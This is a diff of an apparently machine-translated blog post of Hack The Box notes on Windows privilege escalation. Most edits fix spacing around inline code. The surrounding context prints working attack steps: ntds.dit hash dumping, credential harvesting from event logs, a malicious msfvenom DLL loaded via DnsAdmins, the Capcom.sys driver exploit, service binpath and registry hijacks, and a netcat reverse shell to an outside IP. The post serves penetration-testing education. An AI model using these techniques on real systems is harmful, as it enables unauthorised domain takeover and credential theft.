-<p>We can also use it offline<code>SecretsDump</code> obtained from before<code>ntds.dit</code> Extract the hash value from the file. This data can then be passed hashed to access additional resources, or via<code>Hashcat</code> Hack offline to gain more access. If cracked, we can also provide customers with password cracking statistics, provide detailed information about password strength and usage within their domain, and recommend improvements to password policies (increasing minimum password length, creating banned dictionaries, etc.).</p>
+<p>We can also use it offline <code>SecretsDump</code> obtained from before <code>ntds.dit</code> Extract the hash value from the file. This data can then be passed hashed to access additional resources, or via <code>Hashcat</code> Hack offline to gain more access. If cracked, we can also provide customers with password cracking statistics, provide detailed information about password strength and usage within their domain, and recommend improvements to password policies (increasing minimum password length, creating banned dictionaries, etc.).</p>
 <ol><li>Extract hashes using SecretsDump</li></ol>
 <pre><code class="language-shell-session">henduoduo@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
@@ -4432,7 +4432,7 @@ hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c5
 printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 
 &lt;SNIP&gt;</code></pre>
-<p><strong>Robocopy</strong> Copy files with Robocopy built-in tools<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" rel="noreferrer" target="_blank">robocopy</a> Can also be used to back up files. Robocopy is a command-line directory copy tool. It can be used to create backup jobs and includes features such as multi-threaded replication, automatic retry, and recovery replication. Robocopy vs.<code>copy</code>The difference with the command is that not only does it copy all files, it also checks the destination directory and deletes files that are no longer in the source directory. It also compares files before copying, saving time and avoiding copying files that have not changed since the last copy/backup job.</p>
+<p><strong>Robocopy</strong> Copy files with Robocopy built-in tools<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy" rel="noreferrer" target="_blank">robocopy</a> Can also be used to back up files. Robocopy is a command-line directory copy tool. It can be used to create backup jobs and includes features such as multi-threaded replication, automatic retry, and recovery replication. Robocopy vs.<code>copy</code> The difference with the command is that not only does it copy all files, it also checks the destination directory and deletes files that are no longer in the source directory. It also compares files before copying, saving time and avoiding copying files that have not changed since the last copy/backup job.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS.\ntds ntds.dit
 
 -------------------------------------------------------------------------------
@@ -4465,15 +4465,15 @@ printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:
    Speed:           20425.531 MegaBytes/min.
    Ended: Thursday, May 6, 2021 1:11:47 PM</code></pre>
 <h3>Event Log Readers Event Log Readers</h3>
-<p>It is assumed that auditing of process creation events and corresponding command line values is enabled. At this point, the information is saved to the Windows Security Event Log as Event ID 4688: New Process Created. Organizations can support logging of process command lines to help defenders monitor and identify possible malicious behavior and identify binaries that should not be present on the system. This data can be transferred to a SIEM tool, or imported into a search tool such as ElasticSearch, allowing defenders to understand the binaries running on network systems. These tools will then flag any potentially malicious activity, such as those run on the marketing executive’s workstation<code>whoami</code>、<code>netstat</code> and<code>tasklist</code>command.</p>
+<p>It is assumed that auditing of process creation events and corresponding command line values is enabled. At this point, the information is saved to the Windows Security Event Log as Event ID 4688: New Process Created. Organizations can support logging of process command lines to help defenders monitor and identify possible malicious behavior and identify binaries that should not be present on the system. This data can be transferred to a SIEM tool, or imported into a search tool such as ElasticSearch, allowing defenders to understand the binaries running on network systems. These tools will then flag any potentially malicious activity, such as those run on the marketing executive’s workstation <code>whoami</code>、<code>netstat</code> and <code>tasklist</code> command.</p>
 <p>In the Windows Security Log:<strong>4688 = A new process has been created</strong></p>
 <p>That is:</p>
 <blockquote>When a program is started, the system writes a log.</blockquote>
 <p>For example:</p>
 <p>will produce 4688.</p>
 <ul><li>Open cmd.exe</li><li>Run PowerShell</li><li>Execute whoami</li><li>Start an exe</li></ul>
-<p>This research demonstrates some of the most common commands (tasks) executed by attackers after initial access<code>list</code> 、<code>ver</code>、<code>ipconfig</code>、<code>systeminfo</code> etc.), reconnaissance (<code>dir</code>、<code>net view</code>、<code>ping</code>、 <code>network usage</code> 、 <code>type</code>etc.) and spread malware within the network (<code>at</code>、<code>reg</code>、<code>wmic</code>、<code>wusa</code>,etc). In addition to monitoring the execution of these commands, organizations can go a step further and limit the execution of specific commands with finely tuned AppLocker rules. For organizations with tight security budgets, leveraging Microsoft's built-in tools can provide excellent visibility into network activity at the host level. Most modern enterprise EDR tools are capable of detection/blocking, but many organizations struggle to achieve this due to budget and staffing constraints. This small example shows that security improvements, such as network and host layer visibility, can be accomplished with minimal effort, cost, and huge impact.</p>
-<p>A few years ago I performed a penetration test on a mid-sized organization with a small security team and no enterprise EDR, but using a configuration similar to the above (audit process creation and command line values). They captured and controlled one of my team members while they were executing with a member of the Finance Department workstation<code>tasklist</code>command (in use<code>Responder</code> After capturing the credentials and cracking them offline).</p>
+<p>This research demonstrates some of the most common commands (tasks) executed by attackers after initial access <code>list</code> 、<code>ver</code>、<code>ipconfig</code>、<code>systeminfo</code> etc.), reconnaissance (<code>dir</code>、<code>net view</code>、<code>ping</code>、 <code>network usage</code> 、 <code>type</code> etc.) and spread malware within the network (<code>at</code>、<code>reg</code>、<code>wmic</code>、<code>wusa</code>,etc). In addition to monitoring the execution of these commands, organizations can go a step further and limit the execution of specific commands with finely tuned AppLocker rules. For organizations with tight security budgets, leveraging Microsoft's built-in tools can provide excellent visibility into network activity at the host level. Most modern enterprise EDR tools are capable of detection/blocking, but many organizations struggle to achieve this due to budget and staffing constraints. This small example shows that security improvements, such as network and host layer visibility, can be accomplished with minimal effort, cost, and huge impact.</p>
+<p>A few years ago I performed a penetration test on a mid-sized organization with a small security team and no enterprise EDR, but using a configuration similar to the above (audit process creation and command line values). They captured and controlled one of my team members while they were executing with a member of the Finance Department workstation <code>tasklist</code> command (in use <code>Responder</code> After capturing the credentials and cracking them offline).</p>
 <p>Administrators or members of the Event Log Reading?redirectedfrom=MSDN#event-log-readers) group have access to this log. System administrators may want to add power users or developers to this group to perform certain tasks without granting administrator privileges.</p>
 <p><strong>Confirm group members</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; net localgroup "Event Log Readers"
@@ -4492,28 +4492,28 @@ The command completed successfully.</code></pre>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"
 
         Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
-<p>We can also use<code>Parameter /u</code> and<code>/p</code> for<code>wevtutil</code> Specify alternate credentials.</p>
+<p>We can also use <code>Parameter /u</code> and <code>/p</code> for <code>wevtutil</code> Specify alternate credentials.</p>
 <p><strong>Passing Credentials to wevtutil</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
-<p>for<code>Get-WinEvent</code>, the syntax is as follows. In this example, we filter for process creation events (4688) where the process command line contains<code>/user</code>.</p>
-<blockquote>NOTE: Use<code>Get-WInEvent</code> Search<code>Safety</code>Event log requires administrator rights or registry key<code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> Make permission adjustments. just<code>Event log reading</code>Group membership is not enough.</blockquote>
+<p>for <code>Get-WinEvent</code>, the syntax is as follows. In this example, we filter for process creation events (4688) where the process command line contains <code>/user</code>.</p>
+<blockquote>NOTE: Use <code>Get-WInEvent</code> Search <code>Safety</code> Event log requires administrator rights or registry key <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> Make permission adjustments. just <code>Event log reading</code> Group membership is not enough.</blockquote>
 <p><strong>Search security logs using Get-WinEvent</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 
 CommandLine
 -----------
 net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
-<p>This cmdlet is also available as another user<code>-Credential</code> parameters run. Other logs include PowerShell logs, which may contain sensitive information or credentials if script block or module logging is enabled. This log is open to users without permission.</p>
+<p>This cmdlet is also available as another user <code>-Credential</code> parameters run. Other logs include PowerShell logs, which may contain sensitive information or credentials if script block or module logging is enabled. This log is open to users without permission.</p>
 <h3>DnsAdmins DNS administrator</h3>
-<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" rel="noreferrer" target="_blank">DnsAdmins</a> Members of the group can access DNS information on the network. The Windows DNS service supports custom plug-ins and can call functions in the plug-ins to resolve name queries that are not within the scope of any locally hosted DNS zone. DNS service starts with<code>NT AUTHORITY\SYSTEM</code> mode, so membership in this group may be used to escalate privileges on a domain controller, or when there is a standalone server acting as the DNS server for the domain. You can use the built-in<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noreferrer" target="_blank">dnscmd</a> Tool to specify the path to the plug-in DLL. As detailed in this excellent article, the following attacks can be carried out when DNS is running on a domain controller (very common):</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins" rel="noreferrer" target="_blank">DnsAdmins</a> Members of the group can access DNS information on the network. The Windows DNS service supports custom plug-ins and can call functions in the plug-ins to resolve name queries that are not within the scope of any locally hosted DNS zone. DNS service starts with <code>NT AUTHORITY\SYSTEM</code> mode, so membership in this group may be used to escalate privileges on a domain controller, or when there is a standalone server acting as the DNS server for the domain. You can use the built-in<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd" rel="noreferrer" target="_blank">dnscmd</a> Tool to specify the path to the plug-in DLL. As detailed in this excellent article, the following attacks can be carried out when DNS is running on a domain controller (very common):</p>
 <p>Management via RPC</p>
-<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> Allows us to load a custom DLL without any validation of the DLL path. This can be done via the command line<code>dnscmd</code> Tool complete</p>
-<p>When<code>DnsAdmins</code> Members of the group perform the following<code>dnscmd</code> When commanded, register<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> The table key will be populated</p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> Allows us to load a custom DLL without any validation of the DLL path. This can be done via the command line <code>dnscmd</code> Tool complete</p>
+<p>When <code>DnsAdmins</code> Members of the group perform the following <code>dnscmd</code> When commanded, register <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> The table key will be populated</p>
 <p>When the DNS service is restarted, the DLL in this path will be loaded (i.e., the network share accessible to the domain controller machine account)</p>
 <p>An attacker could load a custom DLL to obtain a reverse shell, or even load tools like Mimikatz as a DLL to dump credentials.</p>
 <ul><li>DNS management is performed over RPC</li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723" rel="noreferrer" target="_blank">ServerLevelPluginDll</a> allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
 <p><strong>Leveraging DnsAdmins Access, Leveraging DnsAdmins Access</strong></p>
-<p>We can generate a malicious DLL using<code>msfvenom</code> Add user to<code>domain admins</code>in the group.</p>
+<p>We can generate a malicious DLL using <code>msfvenom</code> Add user to <code>domain admins</code> in the group.</p>
 <ol><li>Generate malicious DLL</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
 
@@ -4548,7 +4548,7 @@ sc start dns</code></pre>
 <p>now you can get the flag on:</p>
 <pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
 <h3>Print Operators Print Operators</h3>
-<p>The Print Operators group is another extremely privileged group that gives its members<code>SeLoadDriverPrivilege</code>Permissions to manage, create, share, and delete printers connected to domain controllers, as well as the authority to log on locally to the domain controller and shut it down. If we issue the command<code>whoami /priv</code>, and the group is not visible in a non-elevated context<code>SeLoadDriverPrivilege</code>, you need to bypass User Account Control (UAC).</p>
+<p>The Print Operators group is another extremely privileged group that gives its members <code>SeLoadDriverPrivilege</code> Permissions to manage, create, share, and delete printers connected to domain controllers, as well as the authority to log on locally to the domain controller and shut it down. If we issue the command <code>whoami /priv</code>, and the group is not visible in a non-elevated context <code>SeLoadDriverPrivilege</code>, you need to bypass User Account Control (UAC).</p>
 <ol><li>Confirm permissions</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
 
@@ -4560,7 +4560,7 @@ Privilege Name           Description                          State
 SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
 SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
 SeShutdownPrivilege      Shut down the system                 Disabled</code></pre>
-<p>The UACMe code base provides a comprehensive list of UAC bypass methods available from the command line. Alternatively, we can open an administrator command shell from the Graphical User Interface (GUI) and enter the credentials of an account belonging to the Print Operators group. If we check the permissions again,<code>SeLoadDriverPrivilege</code>You will find that the permission is visible but disabled.</p>
+<p>The UACMe code base provides a comprehensive list of UAC bypass methods available from the command line. Alternatively, we can open an administrator command shell from the Graphical User Interface (GUI) and enter the credentials of an account belonging to the Print Operators group. If we check the permissions again,<code>SeLoadDriverPrivilege</code> You will find that the permission is visible but disabled.</p>
 <ol><li>Confirm permissions again</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
 
@@ -4574,7 +4574,7 @@ SeLoadDriverPrivilege         Load and unload device drivers       Disabled
 SeShutdownPrivilege           Shut down the system			       Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre>
-<p>As we all know, the driver<code>Capcom.sys</code>Contains functionality that allows any user to execute shellcode with SYSTEM privileges. We can leverage these permissions to load this vulnerable driver and escalate privileges. We can load the driver using this tool. This PoC not only enables permissions but also loads the driver for us.</p>
+<p>As we all know, the driver <code>Capcom.sys</code> Contains functionality that allows any user to execute shellcode with SYSTEM privileges. We can leverage these permissions to load this vulnerable driver and escalate privileges. We can load the driver using this tool. This PoC not only enables permissions but also loads the driver for us.</p>
 <p>Download it locally and edit it, pasting the following content into the corresponding location.</p>
 <pre><code class="language-c">#include &lt;windows.h&gt;
 #include &lt;assert.h&gt;
@@ -4595,7 +4595,7 @@ Copyright (C) Microsoft Corporation.  All rights reserved.
 
 /out:EnableSeLoadDriverPrivilege.exe
 EnableSeLoadDriverPrivilege.obj</code></pre>
-<p><strong>Add driver reference</strong> <code>Capcom.sys</code>Next, download the driver from here and save it to the specified location<code>C:\temp</code>. Execute the following command to add a reference to the driver under the HKEY_CURRENT_USER tree.</p>
+<p><strong>Add driver reference</strong> <code>Capcom.sys</code> Next, download the driver from here and save it to the specified location <code>C:\temp</code>. Execute the following command to add a reference to the driver under the HKEY_CURRENT_USER tree.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
 
 The operation completed successfully.
@@ -4604,11 +4604,11 @@ The operation completed successfully.
 C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 
 The operation completed successfully.</code></pre>
-<p><code>\??\</code>The special syntax used to reference the path to a malicious driver image is an NT object path. The Win32 API will parse and parse this path in order to correctly locate and load our malicious driver.</p>
+<p><code>\??\</code> The special syntax used to reference the path to a malicious driver image is an NT object path. The Win32 API will parse and parse this path in order to correctly locate and load our malicious driver.</p>
 <p><strong>Confirm the driver is not loading</strong> Using Nirsoft<a href="http://www.nirsoft.net/utils/driverview.html" rel="noreferrer" target="_blank">DriverView.exe</a>, we can verify that the Capcom.sys driver is not loaded.</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt;.\DriverView.exe /stext drivers.txt
 PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
-<p><strong>Verify permissions are enabled</strong> Run this<code>EnableSeLoadDriverPrivilege.exe</code>binary file.</p>
+<p><strong>Verify permissions are enabled</strong> Run this <code>EnableSeLoadDriverPrivilege.exe</code> binary file.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; EnableSeLoadDriverPrivilege.exe
 
 whoami:
@@ -4638,7 +4638,7 @@ Filename: C:\Tools\Capcom.sys</code></pre>
 [+] The SYSTEM shell was launched</code></pre>
 <p>This will start a shell with SYSTEM privileges.</p>
 <img alt="Pasted image 20260228081647" src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png"/>
-<p><strong>Alternative Method - No GUI</strong> If we cannot access the target system via GUI, we must<code>ExploitCapcom.cpp</code>Modify the code before compiling. Here we can edit line 292 and replace it with e.g.<code>"C:\\Windows\\system32\\cmd.exe"</code>Use<code>reverse shell binary</code> Reverse shell binary created.<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
+<p><strong>Alternative Method - No GUI</strong> If we cannot access the target system via GUI, we must <code>ExploitCapcom.cpp</code> Modify the code before compiling. Here we can edit line 292 and replace it with e.g.<code>"C:\\Windows\\system32\\cmd.exe"</code> Use <code>reverse shell binary</code> Reverse shell binary created.<code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
 <pre><code class="language-c">// Launches a command shell process
 static bool LaunchShell()
 {
@@ -4656,17 +4656,17 @@ static bool LaunchShell()
     CloseHandle(ProcessInfo.hProcess);
     return true;
 }</code></pre>
-<p>The string in this example<code>CommandLine</code>Change to:</p>
+<p>The string in this example <code>CommandLine</code> Change to:</p>
 <pre><code class="language-c"> TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");</code></pre>
-<p><code>msfvenom</code>We will set up a listener based on the generated payload, hoping to receive a reverse shell connection when executing the command<code>ExploitCapcom.exe</code>. If the reverse shell connection is blocked for some reason, we can try to bind the shell or execute/add user payload.</p>
-<p><strong>Automation steps</strong> Automation with EopLoadDriver We can use tools like EoPLoadDriver to automate the process of enabling permissions, creating registry keys, and loading drivers<code>NTLoadDriver</code>. To do this we can run the following command:</p>
+<p><code>msfvenom</code> We will set up a listener based on the generated payload, hoping to receive a reverse shell connection when executing the command <code>ExploitCapcom.exe</code>. If the reverse shell connection is blocked for some reason, we can try to bind the shell or execute/add user payload.</p>
+<p><strong>Automation steps</strong> Automation with EopLoadDriver We can use tools like EoPLoadDriver to automate the process of enabling permissions, creating registry keys, and loading drivers <code>NTLoadDriver</code>. To do this we can run the following command:</p>
 <pre><code class="language-cmd-session">C:\htb&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 
 [+] Enabling SeLoadDriverPrivilege
 [+] SeLoadDriverPrivilege Enabled
 [+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
 NTSTATUS: c000010e, WinError: 0</code></pre>
-<p>Then we will run the command<code>ExploitCapcom.exe</code>to pop up a SYSTEM shell or run our custom binary.</p>
+<p>Then we will run the command <code>ExploitCapcom.exe</code> to pop up a SYSTEM shell or run our custom binary.</p>
 <p><strong>clean up</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; reg delete HKCU\System\CurrentControlSet\Capcom
 
@@ -4674,8 +4674,8 @@ Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\C
 
 The operation completed successfully.</code></pre>
 <h3>Server Operators Server Operators</h3>
-<p>The Server Operators group allows members to manage Windows servers without being assigned domain administrator rights. This is a very high-privileged group that can log into servers locally, including domain controllers. Join this group to gain powerful<code>SeBackupPrivilege</code> and<code>SeRestorePrivilege</code> permissions and can control local services.</p>
-<p>let's take a look<code>AppReadiness</code> service. We can confirm that the service is via<code>sc.exe</code> The tool is started as SYSTEM.</p>
+<p>The Server Operators group allows members to manage Windows servers without being assigned domain administrator rights. This is a very high-privileged group that can log into servers locally, including domain controllers. Join this group to gain powerful <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> permissions and can control local services.</p>
+<p>let's take a look <code>AppReadiness</code> service. We can confirm that the service is via <code>sc.exe</code> The tool is started as SYSTEM.</p>
 <ol><li>Query the AppReadiness Service</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; sc qc AppReadiness
 
@@ -4691,7 +4691,7 @@ SERVICE_NAME: AppReadiness
         DISPLAY_NAME: App Readiness
         DEPENDENCIES:
         SERVICE_START_NAME: LocalSystem</code></pre>
-<p>We can use service viewer/controller<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a>, which is part of the system's internal suite, to check service permissions.<code>PsService</code> works like<code>sc</code> Tool that displays service status and configuration and also allows you to start, stop, pause, resume and restart services on local and remote hosts.</p>
+<p>We can use service viewer/controller<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a>, which is part of the system's internal suite, to check service permissions.<code>PsService</code> works like <code>sc</code> Tool that displays service status and configuration and also allows you to start, stop, pause, resume and restart services on local and remote hosts.</p>
 <ol><li>Check service permissions using PsService</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness
 
@@ -4758,7 +4758,7 @@ The command completed successfully.</code></pre>
 [SC] StartService FAILED 1053:
 
 The service did not respond to the start or control request in a timely fashion.</code></pre>
-<blockquote>A "start" must be triggered before the command will be executed. The reason is simple: you change<code>binPath</code> Just changing the configuration is equivalent to changing the "program to be run at next startup".  <strong>But the service will only read at the moment it is started<code>binPath</code> and create a process.</strong></blockquote>
+<blockquote>A "start" must be triggered before the command will be executed. The reason is simple: you change <code>binPath</code> Just changing the configuration is equivalent to changing the "program to be run at next startup".  <strong>But the service will only read at the moment it is started <code>binPath</code> and create a process.</strong></blockquote>
 <p>If we check the membership of the Administrators group, we see that the command was executed successfully.</p>
 <ol><li>Confirm local administrators group membership</li></ol>
 <pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators
@@ -4805,14 +4805,14 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <h3>Weak permission configuration</h3>
 <p>Setting up system permissions is complex and challenging. A slight modification in one place may cause flaws elsewhere. As penetration testers, we need to understand how permissions work in Windows and how misconfigurations can be exploited to escalate privileges. The permission-related flaws discussed in this section are relatively rare (but do occasionally occur) in software applications released by large vendors, while they are common in third-party software, open source software, and custom applications from smaller vendors. Services are usually installed with system privileges, so exploiting flaws related to service privileges often allows full control of the target system. Regardless of the environment, we should always check for weak permissions, both with the help of tools and by hand, in case the tools are inconvenient to use.</p>
 <p><strong>Here are four types of privilege escalation</strong></p>
-<ol><li>File writable -&gt; Replace service exe</li><li>Service controllable -&gt; Change<code>binpath</code></li><li>The path is not quoted -&gt; pre-emptive execution of malicious exe</li><li>Registry is writable -&gt; change<code>ImagePath</code>or auto-start item</li></ol>
+<ol><li>File writable -&gt; Replace service exe</li><li>Service controllable -&gt; Change <code>binpath</code></li><li>The path is not quoted -&gt; pre-emptive execution of malicious exe</li><li>Registry is writable -&gt; change <code>ImagePath</code> or auto-start item</li></ol>
 <p>****</p>
 <ol><li>Permissive File System ACLs (writable service files)</li></ol>
 <p><strong>concept</strong>: if a<strong>Service program files running with SYSTEM permissions are writable by ordinary users</strong>, the attacker can replace the executable file, allowing the system to execute a malicious program when starting the service, thereby gaining high privileges.</p>
 <p><strong>Utilization steps</strong></p>
 <p><strong>① Enumerate service files with weak ACLs</strong>: Automatic scanning system<strong>Service binary permissions are configured incorrectly</strong>.</p>
 <pre><code>SharpUp.exe audit</code></pre>
-<p><strong>② Check file ACL</strong>: Confirm<code>Users</code> or<code>Everyone</code> Do you have<strong>Write permission/Full Control</strong>.</p>
+<p><strong>② Check file ACL</strong>: Confirm <code>Users</code> or <code>Everyone</code> Do you have<strong>Write permission/Full Control</strong>.</p>
 <pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
 <p><strong>③ Generate malicious programs</strong> For example, generate a reverse shell:</p>
 <pre><code>msfvenom -p windows/shell_reverse_tcp -f exe &gt; SecurityService.exe</code></pre>
@@ -4823,7 +4823,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>Function: To serve<strong>SYSTEM permissions</strong>Run, thereby executing malicious programs and gaining high privileges.</p>
 <hr/>
 <ol><li>Weak Service Permissions</li></ol>
-<p><strong>concept</strong>: If an ordinary user has access to a Windows service<strong>SERVICE_ALL_ACCESS permission</strong>, the attacker can modify the service configuration (for example<code>binpath</code>), allowing the service to execute commands specified by the attacker when it starts, thereby gaining administrator privileges.</p>
+<p><strong>concept</strong>: If an ordinary user has access to a Windows service<strong>SERVICE_ALL_ACCESS permission</strong>, the attacker can modify the service configuration (for example <code>binpath</code>), allowing the service to execute commands specified by the attacker when it starts, thereby gaining administrator privileges.</p>
 <p><strong>Utilization steps</strong></p>
 <p><strong>① Enumerate modifiable services</strong>: Automatic scanning system<strong>Service object with incorrect permission configuration</strong>.</p>
 <pre><code>SharpUp.exe audit</code></pre>
@@ -4833,7 +4833,7 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <pre><code>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"</code></pre>
 <p><strong>④ Stop service</strong>: Ensure new configuration is loaded when the service is restarted.</p>
 <pre><code>sc stop WindscribeService</code></pre>
-<p><strong>⑤ Start the service</strong>: The system executes when trying to start the service<code>binpath</code> command in to add the current user to<strong>Administrators group</strong>.</p>
+<p><strong>⑤ Start the service</strong>: The system executes when trying to start the service <code>binpath</code> command in to add the current user to<strong>Administrators group</strong>.</p>
 <pre><code>sc start WindscribeService</code></pre>
 <p>****</p>
 <ol><li>Unquoted Service Path (unquoted service path)</li></ol>
@@ -4849,15 +4849,15 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>Function: Windows will prioritize the execution of malicious programs placed by attackers, thereby<strong>SYSTEM permission to execute code</strong>.</p>
 <hr/>
 <ol><li>Permissive Registry ACLs (writable service registry)</li></ol>
-<p><strong>concept</strong>: If ordinary users are interested in service-related<strong>Registry key has write permission</strong>, an attacker can modify the service's<code>ImagePath</code>, causing the service to execute malicious programs when it starts.</p>
+<p><strong>concept</strong>: If ordinary users are interested in service-related<strong>Registry key has write permission</strong>, an attacker can modify the service's <code>ImagePath</code>, causing the service to execute malicious programs when it starts.</p>
 <p><strong>Utilization steps</strong></p>
 <p><strong>① Enumerate service registry permissions</strong>: Find service registry keys that have write permissions.</p>
 <p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
-<p><strong>② Modify service execution path</strong>: will<code>ImagePath</code> Modified to an attacker-controlled program.</p>
+<p><strong>② Modify service execution path</strong>: will <code>ImagePath</code> Modified to an attacker-controlled program.</p>
 <pre><code class="language-PowerShell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
 <p><strong>③ Start service</strong></p>
 <pre><code class="language-cmd">sc start ModelManagerService</code></pre>
-<p>Function: When the service starts, it will execute a new<code>ImagePath</code>, thus<strong>Run attack code with SYSTEM privileges</strong>.</p>
+<p>Function: When the service starts, it will execute a new <code>ImagePath</code>, thus<strong>Run attack code with SYSTEM privileges</strong>.</p>
 <hr/>
 <ol><li>Modifiable Registry Autorun Binary (modifiable startup item program)</li></ol>
 <p><strong>concept</strong>: Windows will automatically execute certain programs when the system starts or when the user logs in. If an attacker can modify the programs or paths corresponding to these startup items, he can execute malicious code when the user logs in to achieve privilege escalation.</p>
@@ -4869,27 +4869,35 @@ Administrator:des-cbc-md5:d60dfbbf20548938
 <p>③ Replace the startup program: Replace the original file with a program controlled by the attacker.</p>
 <p>④ Wait for user login or system startup</p>
 <p>Function: When the corresponding user logs in or the system starts, Windows will automatically execute malicious programs to obtain higher privileges.</p>
-<h2>Kernel exploit</h2>
-<p>on this<strong>HTB Windows privilege escalation experimental machine</strong> Go up, press this section<strong>3 examples</strong> Run each one again and mention the permissions<strong><code>NT AUTHORITY\SYSTEM</code></strong>, finally read<strong>Administrator Desktop</strong> flag on.</p>
-<p>These 3 examples are:</p>
+<h2>Kernel Exploits</h2>
+<p>On this HTB Windows privilege escalation lab machine, this section walks through three example paths, raises access to <code>NT AUTHORITY\SYSTEM</code>, and then reads the flag from the Administrator desktop.</p>
+<p>The three examples are:</p>
 <ol><li><strong>HiveNightmare / SeriousSam</strong></li></ol>
-<ul><li>Low-privilege users read the shadow copy<code>SAM / SYSTEM / SECURITY</code></li><li>Extract local account hashes offline</li><li>Reuse hashes to gain high privileges</li></ul>
+<ul><li>Read <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> from a shadow copy as a low-privileged user.</li><li>Extract local account hashes offline.</li><li>Reuse the hashes to obtain elevated access.</li></ul>
 <ol><li><strong>PrintNightmare</strong></li></ol>
